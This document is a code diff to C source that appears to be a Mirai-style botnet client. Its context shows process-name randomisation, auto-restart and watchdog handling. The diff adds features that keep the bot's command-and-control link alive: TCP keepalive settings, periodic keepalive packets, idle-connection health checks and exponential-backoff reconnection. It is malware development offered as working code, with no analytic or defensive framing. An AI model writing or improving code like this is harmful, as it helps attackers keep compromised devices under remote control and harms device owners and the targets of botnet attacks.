@@ -39,6 +39,11 @@ static void ioctl_keepalive(void);
 static void randomize_process_name(void);
 static void setup_auto_restart(void);
 static void handle_device_restart(void);
+static void connection_keepalive(void);
+static void connection_health_check(void);
+static int connection_retry_count = 0;
+static time_t last_keepalive = 0;
+static time_t last_connection_time = 0;
 
 #define SINGLE_INSTANCE_PORT 18904
 
@@ -374,10 +379,9 @@ int main(int argc, char **args)
         }
         else if (nfds == 0)
         {
-            uint16_t len = 0;
-
-            if (pings++ % 6 == 0)
-                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
+            // Timeout occurred - perform connection maintenance
+            connection_keepalive();
+            connection_health_check();
         }
 
         if(pending_connection)
@@ -429,6 +433,9 @@ int main(int argc, char **args)
                     }
 
                     pending_connection = FALSE;
+                    connection_retry_count = 0; // Reset retry count on successful connection
+                    last_connection_time = time(NULL);
+                    last_keepalive = time(NULL);
 
                     #ifdef DEBUG
                         printf("[%s] [CONN] connected to CNC successfully\n", timestamp);
@@ -503,6 +510,9 @@ int main(int argc, char **args)
 
             recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
             len = ntohs(len);
+            
+            // Update connection activity timestamp
+            last_connection_time = time(NULL);
             
             time_t now = time(NULL);
             char timestamp[64];
@@ -615,6 +625,17 @@ static void establish_connection(void)
 
     fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));
 
+    // Enable TCP keepalive
+    int keepalive = 1;
+    int keepidle = 30;    // Start keepalive after 30 seconds of idle
+    int keepintvl = 10;   // Send keepalive every 10 seconds
+    int keepcnt = 3;      // Send 3 keepalive probes before giving up
+    
+    setsockopt(fd_serv, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(keepalive));
+    setsockopt(fd_serv, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(keepidle));
+    setsockopt(fd_serv, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(keepintvl));
+    setsockopt(fd_serv, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(keepcnt));
+
     if(resolve_func != NULL)
         resolve_func();
 
@@ -669,7 +690,65 @@ static void teardown_connection(void)
 
     fd_serv = -1;
     pending_connection = FALSE;
-    sleep(1);
+    
+    // Exponential backoff retry
+    int retry_delay = (1 << connection_retry_count);
+    if (retry_delay > 60) retry_delay = 60; // Max 60 seconds
+    connection_retry_count++;
+    
+    #ifdef DEBUG
+        printf("[%s] [CONN] retry delay: %d seconds (attempt %d)\n", timestamp, retry_delay, connection_retry_count);
+    #endif
+    
+    sleep(retry_delay);
+}
+
+static void connection_keepalive(void)
+{
+    time_t now = time(NULL);
+    
+    // Send keepalive every 30 seconds instead of 180
+    if (fd_serv != -1 && !pending_connection && (now - last_keepalive) >= 30) {
+        uint16_t len = 0;
+        int result = send(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
+        
+        if (result == -1) {
+            #ifdef DEBUG
+                printf("[CONN] Keepalive send failed (errno=%d)\n", errno);
+            #endif
+            teardown_connection();
+        } else {
+            last_keepalive = now;
+            #ifdef DEBUG
+                printf("[CONN] Keepalive sent successfully\n");
+            #endif
+        }
+    }
+}
+
+static void connection_health_check(void)
+{
+    time_t now = time(NULL);
+    
+    // Check if connection has been idle for too long
+    if (fd_serv != -1 && !pending_connection && (now - last_connection_time) > 300) {
+        #ifdef DEBUG
+            printf("[CONN] Connection idle for %ld seconds, checking health\n", now - last_connection_time);
+        #endif
+        
+        // Try to send a keepalive to test connection
+        uint16_t len = 0;
+        int result = send(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
+        
+        if (result == -1) {
+            #ifdef DEBUG
+                printf("[CONN] Health check failed (errno=%d), reconnecting\n", errno);
+            #endif
+            teardown_connection();
+        } else {
+            last_connection_time = now;
+        }
+    }
 }
 
 static void setup_verification_listener(void)
